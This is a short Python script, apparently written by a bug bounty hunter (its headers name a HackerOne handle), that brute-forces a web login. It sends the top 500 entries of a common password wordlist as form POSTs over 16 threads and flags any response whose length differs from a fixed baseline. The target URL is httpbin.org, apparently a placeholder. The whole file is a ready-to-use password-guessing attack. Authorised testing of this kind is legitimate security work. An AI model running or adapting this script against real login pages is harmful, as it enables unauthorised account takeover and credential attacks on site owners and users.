import concurrent.futures

import requests
from pathlib import Path

session = requests.Session()
session.headers.update({
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.95 Safari/537.36',
        'X-Emergency': 'In case of emergency contact sumbru@wearehackerone.com',
        'X-Bug-Bounty-Hunter': 'sumbru'
})

def send_post_request(password):
    data = 'redirect=%2F&password=' + password

    try:
        response = session.post(url='https://httpbin.org/post', data=data)
    except Exception as e:
        print(e)
    else:
        if len(response.text) != 18248:
            print(response.status_code, len(response.text), password)
            print(response.text)
        else:
            print(f'MISS: {password}')


if __name__ == '__main__':
    with open(Path('../wordlists/10-million-password-list-top-500.txt'), encoding='utf-8') as file:
        passwords = file.read().splitlines()

    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as executor:
        executor.map(send_post_request, passwords)